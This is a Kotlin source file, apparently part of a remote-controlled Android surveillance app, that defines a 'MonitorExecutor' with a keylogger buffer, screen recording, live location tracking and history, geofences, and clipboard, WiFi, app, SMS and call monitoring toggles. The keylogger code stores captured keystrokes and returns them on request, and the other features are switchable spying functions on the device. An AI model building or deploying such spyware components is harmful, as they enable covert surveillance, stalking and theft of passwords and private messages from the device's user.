package com.abuzahra.manager.executor

import android.content.Context
import android.util.Log
import com.abuzahra.manager.App
import java.io.BufferedReader
import java.io.InputStreamReader

object MonitorExecutor {

    private const val TAG = "MonitorExecutor"

    // In-memory stores for monitoring data
    private var keylogBuffer = StringBuilder()
    private var keyloggerActive = false
    private var screenRecordingActive = false
    private var locationTrackingActive = false
    private var clipboardMonitorActive = false
    private var wifiMonitorActive = false
    private var appMonitorActive = false
    private var smsMonitorActive = false
    private var callMonitorActive = false

    // ===== KEYLOGGER =====
    fun keyloggerStart(): String {
        keyloggerActive = true
        keylogBuffer = StringBuilder()
        return "Keylogger started (requires Accessibility Service)"
    }

    fun keyloggerStop(): String {
        keyloggerActive = false
        return "Keylogger stopped"
    }

    fun getKeylogger(): Map<String, Any> {
        val data = keylogBuffer.toString()
        return mapOf(
            "active" to keyloggerActive,
            "count" to data.length,
            "data" to (data.takeLast(5000).ifBlank { "No data captured yet" })
        )
    }

    fun appendKeylog(text: String) {
        if (keyloggerActive) {
            keylogBuffer.append(text)
            if (keylogBuffer.length > 100000) {
                keylogBuffer = StringBuilder(keylogBuffer.takeLast(50000))
            }
        }
    }

    // ===== SCREEN RECORD =====
    fun screenRecordStart(): String {
        screenRecordingActive = true
        return "Screen recording started (requires MediaProjection permission)"
    }

    fun screenRecordStop(): String {
        screenRecordingActive = false
        return "Screen recording stopped"
    }

    // ===== LOCATION TRACKING =====
    fun locationLive(): String {
        locationTrackingActive = true
        return "Live location tracking started"
    }

    fun locationStop(): String {
        locationTrackingActive = false
        return "Location tracking stopped"
    }

    fun isLocationTrackingActive(): Boolean = locationTrackingActive

    // ===== CLIPBOARD MONITOR =====
    fun clipboardMonitorStart(): String {
        clipboardMonitorActive = true
        return "Clipboard monitoring started"
    }

    fun clipboardMonitorStop(): String {
        clipboardMonitorActive = false
        return "Clipboard monitoring stopped"
    }

    fun isClipboardMonitorActive(): Boolean = clipboardMonitorActive

    // ===== WIFI MONITOR =====
    fun wifiMonitorStart(): String {
        wifiMonitorActive = true
        return "WiFi monitoring started"
    }

    fun wifiMonitorStop(): String {
        wifiMonitorActive = false
        return "WiFi monitoring stopped"
    }

    fun isWifiMonitorActive(): Boolean = wifiMonitorActive

    // ===== APP MONITOR =====
    fun appMonitorStart(): String {
        appMonitorActive = true
        return "App monitoring started"
    }

    fun appMonitorStop(): String {
        appMonitorActive = false
        return "App monitoring stopped"
    }

    fun isAppMonitorActive(): Boolean = appMonitorActive

    // ===== SMS MONITOR =====
    fun smsMonitorStart(): String {
        smsMonitorActive = true
        return "SMS monitoring started"
    }

    fun smsMonitorStop(): String {
        smsMonitorActive = false
        return "SMS monitoring stopped"
    }

    fun isSmsMonitorActive(): Boolean = smsMonitorActive

    // ===== CALL MONITOR =====
    fun callMonitorStart(): String {
        callMonitorActive = true
        return "Call monitoring started"
    }

    fun callMonitorStop(): String {
        callMonitorActive = false
        return "Call monitoring stopped"
    }

    fun isCallMonitorActive(): Boolean = callMonitorActive

    // ===== LOCATION HISTORY =====
    private val locationHistory = mutableListOf<Map<String, Any>>()

    fun addLocationToHistory(lat: Double, lon: Double) {
        locationHistory.add(mapOf(
            "lat" to lat, "lon" to lon, "time" to System.currentTimeMillis()
        ))
        if (locationHistory.size > 500) {
            locationHistory.removeAt(0)
        }
    }

    fun getLocationHistory(): List<Map<String, Any>> {
        return locationHistory.toList()
    }

    // ===== GEO FENCING =====
    private val geoFences = mutableListOf<Map<String, Any>>()

    fun geoAdd(params: Map<String, Any>): String {
        val arg = params["arg"]?.toString() ?: ""
        val parts = arg.split(",")
        if (parts.size >= 2) {
            val lat = parts[0].toDoubleOrNull()
            val lon = parts[1].toDoubleOrNull()
            val radius = parts.getOrNull(2)?.toIntOrNull() ?: 500
            if (lat != null && lon != null) {
                geoFences.add(mapOf("lat" to lat, "lon" to lon, "radius" to radius, "active" to true))
                return "Geofence added: $lat, $lon ($radius m)"
            }
        }
        return "Usage: lat,lon,radius"
    }

    fun geoRemove(params: Map<String, Any>): String {
        val index = params["arg"]?.toString()?.toIntOrNull() ?: -1
        return if (index >= 0 && index < geoFences.size) {
            geoFences.removeAt(index)
            "Geofence removed"
        } else "Invalid index"
    }

    fun geoList(): List<Map<String, Any>> {
        return geoFences.toList()
    }

    // ===== GET ALL MONITOR STATUS =====
    fun getAllStatus(): Map<String, Any> {
        return mapOf(
            "keylogger" to keyloggerActive,
            "screen_recording" to screenRecordingActive,
            "location_tracking" to locationTrackingActive,
            "clipboard_monitor" to clipboardMonitorActive,
            "wifi_monitor" to wifiMonitorActive,
            "app_monitor" to appMonitorActive,
            "sms_monitor" to smsMonitorActive,
            "call_monitor" to callMonitorActive
        )
    }
}
